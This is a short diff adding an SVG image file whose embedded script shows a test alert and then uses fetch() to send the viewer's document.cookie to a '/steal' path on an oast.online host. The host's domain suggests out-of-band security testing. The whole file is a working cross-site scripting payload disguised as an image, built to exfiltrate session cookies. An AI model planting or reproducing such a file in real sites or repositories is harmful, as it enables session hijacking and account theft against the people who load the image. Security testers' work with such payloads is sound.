@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    alert("test");
+    fetch('https://cv89qp2beadj94p3pn9031p9eajw1ga8s.oast.online/steal?c='+document.cookie);
+  </script>
+</svg>
